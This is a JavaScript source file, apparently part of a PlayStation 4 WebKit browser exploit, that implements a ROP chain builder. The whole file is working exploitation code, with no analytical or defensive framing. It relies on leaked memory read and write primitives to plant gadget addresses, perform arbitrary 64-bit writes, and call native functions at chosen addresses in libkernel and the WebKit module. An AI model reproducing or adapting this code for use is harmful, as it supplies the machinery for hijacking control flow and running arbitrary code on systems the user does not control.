/* Leave these values untouched, they will be set properly post-exploitation */
var moduleBaseAddresses =
{
  'libkernel': 0,
  'libSceWebKit2': 0
};

/* Simply adds given offset to given module's base address */
function getGadget(moduleName, offset)
{
  return moduleBaseAddresses[moduleName].add32(offset);
}

/* Called to start a new ROP chain */
var rop = function(p) {
  this.ropChain = new Uint32Array(0x1000);
  this.ropChainPtr = p.read8(p.leakval(this.ropChain).add32(0x28));
  this.count = 0;

  /* Clears the chain */
  this.clear = function() {
    this.count = 0;
    this.runtime = undefined;

    for (var i = 0; i < 0xFF0 / 2; i++)
    {
      p.write8(this.ropChainPtr.add32(i*8), 0);
    }
  };

  /* Gets the current chain index and increments it */
  this.getChainIndex = function() {
    this.count++;
    return this.count-1;
  }

  /* Pushes a gadget or value on the stack */
  this.push = function(val) {
    p.write8(this.ropChainPtr.add32(this.getChainIndex() * 8), val);
  }

  /* Writes a 64-bit value to given location */
  this.push64 = function(where, what)
  {
    this.push(window.gadgets["pop rdi"]);
    this.push(where);
    this.push(window.gadgets["pop rsi"]);
    this.push(what);
    this.push(window.gadgets["mov qword ptr [rdi], rsi"]);
  }

  /* Sets up a function call into a module by address */
  this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9)
  {
    this.push(window.gadgets["pop rdi"]);
    this.push(rdi);
    this.push(window.gadgets["pop rsi"]);
    this.push(rsi);
    this.push(window.gadgets["pop rdx"]);
    this.push(rdx);
    this.push(window.gadgets["pop rcx"]);
    this.push(rcx);
    this.push(window.gadgets["pop r8"]);
    this.push(r8);
    this.push(window.gadgets["pop r9"]);
    this.push(r9);
    this.push(rip);
    return this;
  }

  /* Loads the ROP chain and initializes it */
  this.run = function() {
    var retv = p.loadchain(this);
    this.clear();

    return retv;
  }
  return this;
};
